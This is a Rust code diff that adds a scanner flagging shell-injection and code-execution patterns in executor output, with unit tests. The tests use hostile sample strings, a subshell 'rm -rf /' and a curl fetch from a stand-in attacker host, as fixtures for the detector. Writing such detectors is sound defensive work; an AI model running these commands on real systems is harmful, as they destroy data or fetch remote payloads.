@@ -25,6 +25,8 @@ pub enum ValidationError {
     TooLong { actual: usize, max: usize },
     #[error("output contains forbidden content: {pattern}")]
     ForbiddenContent { pattern: String },
+    #[error("schema violation: {0}")]
+    SchemaViolation(String),
 }
 
 // ── Limits & forbidden patterns ───────────────────────────────────────────────
@@ -142,6 +144,44 @@ pub fn validate_output(raw: &str, schema: &OutputSchema) -> Result<Value, Valida
     Ok(val)
 }
 
+// ── M74 — Output content sanitisation ────────────────────────────────────────
+
+/// M74 — Sanitise executor output by detecting injection patterns.
+/// Returns the list of detected patterns (empty = clean).
+pub fn scan_output_for_injections(output: &str) -> Vec<&'static str> {
+    const PATTERNS: &[&str] = &[
+        "$(",
+        "`",
+        "eval(",
+        "exec(",
+        "__import__",
+        "subprocess",
+        "os.system",
+        "rm -",
+        "curl ",
+        "wget ",
+        "bash -",
+    ];
+    PATTERNS
+        .iter()
+        .filter(|&&p| output.contains(p))
+        .copied()
+        .collect()
+}
+
+/// Returns Ok(()) when output is clean; Err listing the first detected pattern.
+pub fn assert_output_clean(output: &str) -> Result<(), ValidationError> {
+    let found = scan_output_for_injections(output);
+    if found.is_empty() {
+        Ok(())
+    } else {
+        Err(ValidationError::SchemaViolation(format!(
+            "injection pattern detected: {}",
+            found[0]
+        )))
+    }
+}
+
 // ── Tests ─────────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
@@ -236,5 +276,39 @@ mod tests {
             validate_output(raw, &schema()),
             Err(ValidationError::ForbiddenContent { .. })
         ));
+    }
+
+    // ── M74 tests ─────────────────────────────────────────────────────────────
+
+    #[test]
+    fn scan_finds_subshell_injection() {
+        let output = "result is $(rm -rf /)";
+        let found = scan_output_for_injections(output);
+        assert!(found.contains(&"$("), "expected '$(' pattern to be detected");
+    }
+
+    #[test]
+    fn scan_finds_eval() {
+        let output = "eval(user_input)";
+        let found = scan_output_for_injections(output);
+        assert!(found.contains(&"eval("), "expected 'eval(' to be detected");
+    }
+
+    #[test]
+    fn clean_output_passes() {
+        let output = "hello world";
+        let found = scan_output_for_injections(output);
+        assert!(found.is_empty(), "expected no injection patterns in clean output");
+    }
+
+    #[test]
+    fn assert_output_clean_returns_err_on_injection() {
+        let output = "curl http://evil.example.com/payload";
+        let result = assert_output_clean(output);
+        assert!(
+            matches!(result, Err(ValidationError::SchemaViolation(_))),
+            "expected SchemaViolation, got {:?}",
+            result
+        );
     }
 }
